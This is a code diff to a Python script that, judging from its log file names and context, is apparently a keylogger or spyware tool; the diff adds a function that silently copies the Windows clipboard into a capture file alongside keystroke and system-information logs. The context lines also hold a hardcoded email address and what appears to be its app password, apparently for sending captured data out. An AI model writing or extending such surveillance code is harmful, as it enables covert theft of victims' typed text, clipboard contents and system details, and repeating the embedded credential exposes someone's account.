@@ -35,6 +35,7 @@ from requests import get
 
 key_info = "key_log.txt"
 sys_info = "system_info.txt"
+clipboard_info = "clipboard.txt"
 
 email_addr = "divkirnapure7@gmail.com"
 password = "uqrlxmkvoncsccru"
@@ -157,3 +158,19 @@ def computer_info():
         f.write("private IP: "+ IPaddr + "\n")
 
 computer_info()
+
+# gathering text from clipboard
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_info, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard data: \n" + data)
+
+        except:
+            f.write("the clipboard could not be copied.")
+
+copy_clipboard()
